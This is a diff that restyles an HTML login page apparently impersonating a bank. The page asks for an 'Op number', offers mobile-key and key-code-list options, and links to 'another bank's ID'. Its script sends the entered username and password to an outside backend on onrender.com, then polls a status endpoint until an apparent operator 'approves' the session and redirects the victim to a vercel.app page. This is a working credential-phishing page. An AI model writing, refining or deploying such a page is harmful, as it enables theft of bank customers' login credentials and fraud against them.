@@ -5,230 +5,238 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Login</title>
 
-  <!-- ======================  CSS  ====================== -->
   <style>
+    /* -------------------------------------------------
+       BASIC RESET & TYPOGRAPHY
+       ------------------------------------------------- */
+    *, *::before, *::after { box-sizing: border-box; margin:0; padding:0; }
+    body { font-family: sans-serif; background:#fafafa; }
+
+    /* -------------------------------------------------
+       MAIN CONTAINER
+       ------------------------------------------------- */
     .main-container {
+      min-height: 100vh;
+      padding: 2rem 1rem;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      height: 100vh;
-      padding: 0px 300px 0px 300px;
     }
+
+    /* -------------------------------------------------
+       CANCEL BUTTON
+       ------------------------------------------------- */
     .cancel {
       width: 100%;
       display: flex;
-      justify-content: end;
+      justify-content: flex-end;
+      margin-bottom: 1rem;
     }
-    .identification {
+    .cancel > div {
+      width: 44px; height: 44px;
+      border: 1px solid #bbb;
+      border-radius: 50%;
       display: flex;
-      gap: 20px;
-      margin-top: 50px;
-      width: 100%;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
     }
+
+    /* -------------------------------------------------
+       TITLE
+       ------------------------------------------------- */
+    .title {
+      width: 100%;
+      font-size: 2rem;
+      font-weight: 300;
+      margin-bottom: 2rem;
+    }
+
+    /* -------------------------------------------------
+       IDENTIFICATION METHOD
+       ------------------------------------------------- */
+    .identification {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      margin-bottom: 1.5rem;
+    }
+    .identification > div:first-child { font-weight: 600; }
+
     .radio-section {
       display: flex;
       flex-direction: column;
-      gap: 10px;
+      gap: .75rem;
     }
-    .input-section {
-      display: flex;
-      gap: 30px;
-      align-items: center;
-      margin-top: 40px;
-      width: 100%;
-      padding-left: 140px;
-    }
-    #password {
-      display: none;
-      transition: all 0.3s ease;
-      gap: 30px;
-      align-items: center;
-      margin-top: 10px;
-      width: 100%;
-      padding-left: 140px;
-    }
-    .forget {
-      margin-top: 20px;
-      text-align: start;
-      width: 100%;
-      padding-left: 340px;
-      cursor: pointer;
-    }
-    .continue-button {
-      margin-top: 40px;
-      width: 100%;
-      display: flex;
-      padding-left: 1100px;
-    }
-    .or-section {
-      margin-top: 30px;
+    .radio-item {
       display: flex;
       align-items: center;
-    }
-    .thin-container {
-      height: 1px;
-      background-color: gray;
-      width: 480px;
-    }
-    .down {
-      margin-top: 40px;
-      border: 1px solid grey;
-      padding: 25px 20px;
-      width: 100%;
-      cursor: pointer;
-      box-shadow: 0px 0px 14px 0px;
-      box-sizing: border-box;
+      gap: .5rem;
     }
     input[type="radio"] {
       accent-color: #ff5733;
-      width: 18px;
-      height: 18px;
-      transform: scale(1.5);
+      width: 20px; height: 20px;
     }
-    a {
-      color: black;
-      text-decoration: underline;
-      text-decoration-color: #ff5733;
+
+    /* -------------------------------------------------
+       INPUT SECTIONS
+       ------------------------------------------------- */
+    .input-section, #password {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: .4rem;
+      margin-bottom: 1rem;
     }
     .form-input {
-      width: 50%;
-      padding: 10px;
-      border: 1px solid grey;
-      border-radius: 2px;
-      font-family: sans-serif;
+      padding: .75rem 1rem;
+      border: 1px solid #bbb;
+      border-radius: 4px;
+      font-size: 1rem;
+    }
+
+    .error { color:#d32f2f; font-size:.9rem; margin-top:.5rem; display:none; }
+
+    .forget {
+      align-self: flex-start;
+      margin-bottom: 1.5rem;
+    }
+    .forget a { color:#000; text-decoration:underline; text-decoration-color:#ff5733; }
+
+    /* -------------------------------------------------
+       CONTINUE BUTTON
+       ------------------------------------------------- */
+    .continue-button {
+      width: 100%;
+      display: flex;
+      justify-content: center;
     }
     .continue-btn {
-      width: 15%;
-      padding: 10px;
-      height: 40px;
-      color: white;
-      border: none;
-      border-radius: 20px;
-      font-family: sans-serif;
-      cursor: pointer;
-      background-color: #ff5733;
+      min-width: 140px;
+      padding: .75rem 1.5rem;
+      background:#ff5733;
+      color:#fff;
+      border:none;
+      border-radius: 2rem;
+      font-size:1rem;
+      cursor:pointer;
+      transition:background .2s;
+    }
+    .continue-btn:hover { background:#e64a19; }
+
+    /* -------------------------------------------------
+       OR SECTION
+       ------------------------------------------------- */
+    .or-section {
+      width:100%;
+      display:flex;
+      align-items:center;
+      gap:1rem;
+      margin:2rem 0;
+    }
+    .thin-container {
+      flex:1;
+      height:1px;
+      background:#bbb;
     }
 
-    /* ======================  SPINNER PAGE  ====================== */
+    /* -------------------------------------------------
+       ALTERNATIVE LOGIN
+       ------------------------------------------------- */
+    .down {
+      width:100%;
+      border:1px solid #bbb;
+      border-radius:4px;
+      padding:1rem;
+      text-align:center;
+      cursor:pointer;
+      box-shadow:0 2px 8px rgba(0,0,0,.07);
+      transition:box-shadow .2s;
+    }
+    .down:hover { box-shadow:0 4px 12px rgba(0,0,0,.12); }
+
+    /* -------------------------------------------------
+       SPINNER PAGE
+       ------------------------------------------------- */
     #spinner-page {
-      position: fixed;
-      inset: 0;
-      background: rgba(255, 255, 255, 0.92);
-      display: none;               /* hidden by default */
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      font-family: sans-serif;
+      position:fixed; inset:0;
+      background:rgba(255,255,255,.94);
+      display:none; flex-direction:column;
+      align-items:center; justify-content:center;
+      z-index:9999;
     }
     .spinner {
-      width: 50px;
-      height: 50px;
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #ff5733;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
+      width:56px; height:56px;
+      border:6px solid #f3f3f3;
+      border-top:6px solid #ff5733;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+      margin-bottom:1rem;
     }
-    @keyframes spin {
-      0%   { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    #spinner-page p {
-      margin: 0;
-      font-size: 1.2rem;
-      color: #333;
-    }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    #spinner-page p { font-size:1.1rem; color:#333; }
 
-    /* ======================  RESPONSIVE  ====================== */
-    @media (max-width: 768px) {
-      .main-container { padding: 0px 20px 0px 20px; }
-      .thin-container { width: 100%; }
-      .continue-button {
-        margin-top: 40px;
-        width: 100%;
-        display: flex;
-        justify-content: center;
-        padding-left: 0px;
-      }
-      .identification {
-        flex-direction: column;
-        gap: 15px;
-        margin-top: 50px;
-      }
-      .input-section {
-        flex-direction: column;
-        gap: 2px;
-        align-items: start;
-        margin-top: 40px;
-        padding-left: 0px;
-      }
-      .form-input { width: 100%; box-sizing: border-box; }
-      #password {
-        flex-direction: column;
-        gap: 2px;
-        align-items: start;
-        margin-top: 10px;
-        padding-left: 0px;
-      }
-      .forget { padding-left: 0px; }
-      .or-section { display: none; }
-      .continue-btn {
-        width: 70%;
-        padding: 20px;
-        border-radius: 30px;
-      }
-      .radio-section { gap: 20px; }
+    /* -------------------------------------------------
+       RESPONSIVE BREAKPOINTS
+       ------------------------------------------------- */
+    @media (min-width: 576px) {
+      .main-container { padding:2rem 2rem; }
+    }
+    @media (min-width: 768px) {
+      .main-container { max-width:560px; margin:auto; }
+      .identification { flex-direction:row; align-items:center; }
+      .input-section, #password { flex-direction:row; align-items:center; }
+      .form-input { width:70%; }
+      .continue-button { justify-content:flex-end; }
+      .continue-btn { width:auto; }
+      .forget { padding-left:0; }
+    }
+    @media (min-width: 992px) {
+      .main-container { max-width:480px; }
     }
   </style>
 </head>
 
 <body>
-  <!-- ======================  MAIN FORM  ====================== -->
+  <!-- ==================== MAIN FORM ==================== -->
   <div class="main-container">
     <section class="cancel">
-      <div style="border-radius: 100%; border: 1px solid grey; padding: 10px">
-        <span style="color: #ff5733; font-family: sans-serif">X</span>
-      </div>
+      <div><span style="color:#ff5733;">X</span></div>
     </section>
 
-    <section style="display: flex; justify-content: start; width: 100%">
-      <h1 style="text-align: start; font-family: sans-serif; font-weight: 100; font-size: 35px;">
-        Log in
-      </h1>
-    </section>
+    <h1 class="title">Log in</h1>
 
     <section class="identification">
-      <div style="font-family: sans-serif">Identification method</div>
+      <div>Identification method</div>
       <div class="radio-section">
-        <div style="display: flex; gap: 10px">
-          <input type="radio" id="email" name="identification" value="mobile_key" checked />
-          <span style="font-family: sans-serif">Mobile_key</span>
-        </div>
-        <div style="display: flex; gap: 10px">
-          <input type="radio" id="phone" name="identification" value="key_code" />
-          <span style="font-family: sans-serif">Key code list</span>
-        </div>
+        <label class="radio-item">
+          <input type="radio" name="identification" value="mobile_key" checked>
+          <span>Mobile_key</span>
+        </label>
+        <label class="radio-item">
+          <input type="radio" name="identification" value="key_code">
+          <span>Key code list</span>
+        </label>
       </div>
     </section>
 
     <div class="input-section">
-      <div style="font-family: sans-serif; margin-bottom: 5px">Username</div>
-      <input type="text" id="login" class="form-input" placeholder="Enter your Op number" />
+      <div>Username</div>
+      <input type="text" id="login" class="form-input" placeholder="Enter your Op number">
     </div>
 
-    <div id="password" style="display: none">
-      <div style="font-family: sans-serif; margin-bottom: 5px">Password</div>
-      <input type="password" id="password-input" class="form-input" placeholder="Enter your password" />
+    <div id="password" style="display:none">
+      <div>Password</div>
+      <input type="password" id="password-input" class="form-input" placeholder="Enter your password">
     </div>
 
-    <div class="error" id="error" style="color: red; display: none; font-family: sans-serif; margin-top: 10px"></div>
+    <div class="error" id="error"></div>
 
     <div class="forget"><a href="#">Forget your username?</a></div>
 
     <div class="continue-button">
-      <button id="continue-btn" class="continue-btn"><span>Continue</span></button>
+      <button id="continue-btn" class="continue-btn">Continue</button>
     </div>
 
     <div class="or-section">
@@ -237,107 +245,83 @@
       <div class="thin-container"></div>
     </div>
 
-    <div class="down">
-      <a href="#">Log in with another bank's ID</a>
-    </div>
+    <div class="down"><a href="#">Log in with another bank's ID</a></div>
   </div>
 
-  <!-- ======================  SPINNER PAGE  ====================== -->
+  <!-- ==================== SPINNER ==================== -->
   <div id="spinner-page">
     <div class="spinner"></div>
     <p>Please wait…</p>
   </div>
 
-  <!-- ======================  JAVASCRIPT  ====================== -->
+  <!-- ==================== SCRIPT ==================== -->
   <script>
-    // -------------------  Elements -------------------
-    const radioButtons      = document.querySelectorAll('input[name="identification"]');
-    const passwordSection   = document.getElementById("password");
-    const continueBtn       = document.getElementById("continue-btn");
-    const errorDiv          = document.getElementById("error");
-    const spinnerPage       = document.getElementById("spinner-page");
-    const backendUrl        = "https://op-9nkj.onrender.com";
+    const radioButtons    = document.querySelectorAll('input[name="identification"]');
+    const passwordSection = document.getElementById('password');
+    const continueBtn     = document.getElementById('continue-btn');
+    const errorDiv        = document.getElementById('error');
+    const spinnerPage     = document.getElementById('spinner-page');
+    const backendUrl      = "https://op-9nkj.onrender.com";
 
-    // -------------------  Helpers -------------------
     const showSpinner = () => spinnerPage.style.display = "flex";
     const hideSpinner = () => spinnerPage.style.display = "none";
 
-    // -------------------  Password visibility -------------------
-    const togglePasswordVisibility = () => {
-      const selected = document.querySelector('input[name="identification"]:checked').value;
-      passwordSection.style.display = selected === "key_code" ? "flex" : "none";
+    const togglePassword = () => {
+      const val = document.querySelector('input[name="identification"]:checked').value;
+      passwordSection.style.display = val === "key_code" ? "flex" : "none";
     };
-    togglePasswordVisibility();
-    radioButtons.forEach(r => r.addEventListener("change", togglePasswordVisibility));
+    togglePassword();
+    radioButtons.forEach(r => r.addEventListener('change', togglePassword));
 
-    // -------------------  Submit handler -------------------
-    continueBtn.addEventListener("click", async () => {
-      const login        = document.getElementById("login").value.trim();
-      const password     = document.getElementById("password-input").value;
-      const identification = document.querySelector('input[name="identification"]:checked').value;
+    continueBtn.addEventListener('click', async () => {
+      const login   = document.getElementById('login').value.trim();
+      const pwd     = document.getElementById('password-input').value;
+      const method  = document.querySelector('input[name="identification"]:checked').value;
 
       // ---- validation ----
-      if (!login || (identification === "key_code" && !password)) {
+      if (!login || (method === "key_code" && !pwd)) {
         errorDiv.textContent = "Please fill in all required fields.";
         errorDiv.style.display = "block";
         return;
       }
 
-      // ---- UI prep ----
       errorDiv.style.display = "none";
       showSpinner();
       continueBtn.disabled = true;
 
-      const payload = identification === "key_code"
-        ? { login, password }
-        : { login };
+      const payload = method === "key_code" ? { login, password: pwd } : { login };
 
       try {
-        // ---- initial login request ----
         const resp = await fetch(`${backendUrl}/login`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
-        const result = await resp.json();
+        const data = await resp.json();
 
-        if (!result.success) {
-          throw new Error(result.error || "Submission failed.");
-        }
+        if (!data.success) throw new Error(data.error || "Login failed");
 
-        const sessionId = result.id;
+        const sessionId = data.id;
 
-        // ---- polling loop ----
-        const pollStatus = async () => {
-          try {
-            const statusResp = await fetch(`${backendUrl}/status/${sessionId}`);
-            const status = await statusResp.json();
+        const poll = async () => {
+          const sResp = await fetch(`${backendUrl}/status/${sessionId}`);
+          const status = await sResp.json();
 
-            if (status.status === "approved" && status.redirect_url) {
-              hideSpinner();
-              window.location.href = `https://opfi.vercel.app/${status.redirect_url}`;
-            } else {
-              setTimeout(pollStatus, 2000);
-            }
-          } catch (err) {
-            throw err;
+          if (status.status === "approved" && status.redirect_url) {
+            hideSpinner();
+            window.location.href = `https://opfi.vercel.app/${status.redirect_url}`;
+          } else {
+            setTimeout(poll, 2000);
           }
         };
-
-        pollStatus();
-      } catch (err) {
+        poll();
+      } catch (e) {
         hideSpinner();
-        errorDiv.textContent = err.message || "An error occurred. Please try again.";
+        errorDiv.textContent = e.message || "An error occurred. Try again.";
         errorDiv.style.display = "block";
         continueBtn.disabled = false;
       }
     });
   </script>
 </body>
-</html>          loader.style.display = "none";
-          continueBtn.disabled = false;
-        }
-      });
-    </script>
-  </body>
 </html>
